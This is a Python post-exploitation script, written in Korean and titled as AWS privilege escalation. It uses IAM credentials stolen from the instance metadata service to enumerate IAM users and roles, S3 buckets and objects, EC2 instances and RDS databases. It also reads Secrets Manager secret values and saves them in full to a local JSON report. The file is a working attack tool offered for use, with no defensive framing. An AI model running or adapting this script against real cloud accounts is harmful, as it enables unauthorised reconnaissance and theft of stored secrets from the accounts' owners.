#!/usr/bin/env python3
"""
AWS 권한 상승 및 리소스 열거

IMDS에서 탈취한 IAM credentials를 사용하여:
- IAM 권한 확인
- S3 버킷 열거
- EC2 인스턴스 목록
- RDS 데이터베이스 확인
- Secrets Manager 비밀 정보
"""

import os
import sys
import json
from datetime import datetime

try:
    import boto3
    from botocore.exceptions import ClientError, NoCredentialsError
except ImportError:
    print("[-] boto3 설치 필요: pip3 install boto3")
    sys.exit(1)


class AWSPrivilegeEscalation:
    def __init__(self):
        # 환경 변수에서 credentials 로드
        self.access_key = os.environ.get('AWS_ACCESS_KEY_ID')
        self.secret_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
        self.session_token = os.environ.get('AWS_SESSION_TOKEN')

        if not self.access_key:
            print("[-] AWS credentials를 찾을 수 없습니다")
            print("[!] 먼저 'imds' 명령어를 실행하세요")
            sys.exit(1)

        # boto3 세션 생성
        self.session = boto3.Session(
            aws_access_key_id=self.access_key,
            aws_secret_access_key=self.secret_key,
            aws_session_token=self.session_token
        )

        self.region = os.environ.get('AWS_DEFAULT_REGION', 'ap-northeast-2')

        # 결과 저장
        self.findings = {
            'timestamp': datetime.now().isoformat(),
            'credentials': {
                'access_key': self.access_key,
                'type': 'IAM Role (from IMDS)'
            },
            'permissions': {},
            'resources': {}
        }

    def print_banner(self):
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  AWS 권한 상승 및 리소스 열거".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()
        print(f"[*] Access Key: {self.access_key[:20]}...")
        print(f"[*] Region: {self.region}")
        print()

    def check_iam_permissions(self):
        """IAM 권한 확인"""
        print("[1] IAM 권한 확인 중...")
        print()

        iam = self.session.client('iam')
        sts = self.session.client('sts')

        try:
            # 현재 사용자 정보
            identity = sts.get_caller_identity()
            print(f"[+] Account ID: {identity['Account']}")
            print(f"[+] User ARN: {identity['Arn']}")
            print(f"[+] User ID: {identity['UserId']}")
            print()

            self.findings['identity'] = identity

            # IAM 사용자 목록 (권한이 있을 경우)
            try:
                users = iam.list_users()
                user_count = len(users['Users'])
                print(f"[+] IAM 사용자: {user_count}명")
                self.findings['permissions']['iam:ListUsers'] = True

                for user in users['Users'][:5]:  # 처음 5명만
                    print(f"    - {user['UserName']} (생성: {user['CreateDate']})")
            except ClientError:
                print("[!] IAM 사용자 목록 권한 없음")
                self.findings['permissions']['iam:ListUsers'] = False

            # IAM 역할 목록
            try:
                roles = iam.list_roles()
                role_count = len(roles['Roles'])
                print(f"[+] IAM 역할: {role_count}개")
                self.findings['permissions']['iam:ListRoles'] = True
            except ClientError:
                print("[!] IAM 역할 목록 권한 없음")
                self.findings['permissions']['iam:ListRoles'] = False

            print()

        except ClientError as e:
            print(f"[-] IAM 권한 확인 실패: {e}")
            print()

    def enumerate_s3(self):
        """S3 버킷 열거"""
        print("[2] S3 버킷 열거 중...")
        print()

        s3 = self.session.client('s3')

        try:
            buckets = s3.list_buckets()
            bucket_list = buckets['Buckets']

            print(f"[+] S3 버킷 발견: {len(bucket_list)}개")
            print()

            self.findings['resources']['s3_buckets'] = []

            for bucket in bucket_list[:10]:  # 처음 10개만
                bucket_name = bucket['Name']
                print(f"[+] 버킷: {bucket_name}")

                bucket_info = {
                    'name': bucket_name,
                    'creation_date': bucket['CreationDate'].isoformat()
                }

                # 버킷 위치 확인
                try:
                    location = s3.get_bucket_location(Bucket=bucket_name)
                    region = location['LocationConstraint'] or 'us-east-1'
                    print(f"    리전: {region}")
                    bucket_info['region'] = region
                except ClientError:
                    pass

                # 버킷 ACL 확인
                try:
                    acl = s3.get_bucket_acl(Bucket=bucket_name)
                    public = any(
                        grant['Grantee'].get('URI') == 'http://acs.amazonaws.com/groups/global/AllUsers'
                        for grant in acl['Grants']
                    )
                    if public:
                        print(f"    ⚠️  공개 버킷!")
                        bucket_info['public'] = True
                except ClientError:
                    pass

                # 객체 목록 (처음 5개)
                try:
                    objects = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
                    if 'Contents' in objects:
                        print(f"    객체: {objects['KeyCount']}개")
                        bucket_info['objects'] = []
                        for obj in objects['Contents']:
                            print(f"      - {obj['Key']} ({obj['Size']} bytes)")
                            bucket_info['objects'].append({
                                'key': obj['Key'],
                                'size': obj['Size']
                            })
                except ClientError:
                    pass

                print()
                self.findings['resources']['s3_buckets'].append(bucket_info)

        except ClientError as e:
            print(f"[-] S3 접근 권한 없음: {e}")
            print()

    def enumerate_ec2(self):
        """EC2 인스턴스 열거"""
        print("[3] EC2 인스턴스 열거 중...")
        print()

        ec2 = self.session.client('ec2', region_name=self.region)

        try:
            instances = ec2.describe_instances()

            instance_list = []
            for reservation in instances['Reservations']:
                for instance in reservation['Instances']:
                    instance_list.append(instance)

            print(f"[+] EC2 인스턴스 발견: {len(instance_list)}개")
            print()

            self.findings['resources']['ec2_instances'] = []

            for instance in instance_list[:10]:
                instance_id = instance['InstanceId']
                state = instance['State']['Name']
                instance_type = instance['InstanceType']

                # 이름 태그 찾기
                name = 'N/A'
                if 'Tags' in instance:
                    for tag in instance['Tags']:
                        if tag['Key'] == 'Name':
                            name = tag['Value']
                            break

                print(f"[+] {instance_id} ({name})")
                print(f"    상태: {state}")
                print(f"    타입: {instance_type}")

                instance_info = {
                    'id': instance_id,
                    'name': name,
                    'state': state,
                    'type': instance_type
                }

                # IP 주소
                if 'PublicIpAddress' in instance:
                    print(f"    공인 IP: {instance['PublicIpAddress']}")
                    instance_info['public_ip'] = instance['PublicIpAddress']

                if 'PrivateIpAddress' in instance:
                    print(f"    사설 IP: {instance['PrivateIpAddress']}")
                    instance_info['private_ip'] = instance['PrivateIpAddress']

                # 보안 그룹
                if 'SecurityGroups' in instance:
                    print(f"    보안 그룹: {', '.join([sg['GroupName'] for sg in instance['SecurityGroups']])}")
                    instance_info['security_groups'] = [sg['GroupId'] for sg in instance['SecurityGroups']]

                print()
                self.findings['resources']['ec2_instances'].append(instance_info)

        except ClientError as e:
            print(f"[-] EC2 접근 권한 없음: {e}")
            print()

    def enumerate_rds(self):
        """RDS 데이터베이스 열거"""
        print("[4] RDS 데이터베이스 열거 중...")
        print()

        rds = self.session.client('rds', region_name=self.region)

        try:
            databases = rds.describe_db_instances()
            db_list = databases['DBInstances']

            print(f"[+] RDS 인스턴스 발견: {len(db_list)}개")
            print()

            self.findings['resources']['rds_instances'] = []

            for db in db_list:
                db_id = db['DBInstanceIdentifier']
                engine = db['Engine']
                status = db['DBInstanceStatus']

                print(f"[+] {db_id}")
                print(f"    엔진: {engine} {db.get('EngineVersion', 'N/A')}")
                print(f"    상태: {status}")
                print(f"    엔드포인트: {db['Endpoint']['Address']}:{db['Endpoint']['Port']}")
                print(f"    마스터 사용자: {db['MasterUsername']}")

                db_info = {
                    'id': db_id,
                    'engine': engine,
                    'status': status,
                    'endpoint': f"{db['Endpoint']['Address']}:{db['Endpoint']['Port']}",
                    'master_user': db['MasterUsername']
                }

                # 공개 접근 가능 여부
                if db.get('PubliclyAccessible'):
                    print(f"    ⚠️  공개 접근 가능!")
                    db_info['publicly_accessible'] = True

                print()
                self.findings['resources']['rds_instances'].append(db_info)

        except ClientError as e:
            print(f"[-] RDS 접근 권한 없음: {e}")
            print()

    def enumerate_secrets(self):
        """Secrets Manager 비밀 정보 열거"""
        print("[5] Secrets Manager 비밀 정보 열거 중...")
        print()

        secrets = self.session.client('secretsmanager', region_name=self.region)

        try:
            secret_list = secrets.list_secrets()

            if 'SecretList' in secret_list:
                secrets_found = secret_list['SecretList']
                print(f"[+] 비밀 정보 발견: {len(secrets_found)}개")
                print()

                self.findings['resources']['secrets'] = []

                for secret in secrets_found[:10]:
                    secret_name = secret['Name']
                    print(f"[+] {secret_name}")

                    secret_info = {
                        'name': secret_name
                    }

                    if 'Description' in secret:
                        print(f"    설명: {secret['Description']}")
                        secret_info['description'] = secret['Description']

                    # 비밀 값 읽기 시도
                    try:
                        value = secrets.get_secret_value(SecretId=secret_name)
                        if 'SecretString' in value:
                            print(f"    ⚠️  비밀 값 읽기 성공!")
                            print(f"    값: {value['SecretString'][:100]}...")
                            secret_info['value'] = value['SecretString']
                    except ClientError:
                        print(f"    비밀 값 읽기 권한 없음")

                    print()
                    self.findings['resources']['secrets'].append(secret_info)
            else:
                print("[!] 비밀 정보 없음")
                print()

        except ClientError as e:
            print(f"[-] Secrets Manager 접근 권한 없음: {e}")
            print()

    def save_report(self):
        """결과를 JSON 파일로 저장"""
        filename = f"aws_enum_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        with open(filename, 'w') as f:
            json.dump(self.findings, f, indent=2, default=str)

        print()
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  스캔 완료!".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()
        print(f"[+] 결과 저장됨: {filename}")
        print()

        # 요약
        print("📊 요약:")
        if 'resources' in self.findings:
            resources = self.findings['resources']
            if 's3_buckets' in resources:
                print(f"  - S3 버킷: {len(resources['s3_buckets'])}개")
            if 'ec2_instances' in resources:
                print(f"  - EC2 인스턴스: {len(resources['ec2_instances'])}개")
            if 'rds_instances' in resources:
                print(f"  - RDS 인스턴스: {len(resources['rds_instances'])}개")
            if 'secrets' in resources:
                print(f"  - 비밀 정보: {len(resources['secrets'])}개")
        print()

    def run(self):
        """전체 스캔 실행"""
        self.print_banner()
        self.check_iam_permissions()
        self.enumerate_s3()
        self.enumerate_ec2()
        self.enumerate_rds()
        self.enumerate_secrets()
        self.save_report()


def main():
    """메인 함수"""
    try:
        scanner = AWSPrivilegeEscalation()
        scanner.run()
    except KeyboardInterrupt:
        print("\n[!] 사용자에 의해 중단됨")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] 오류 발생: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
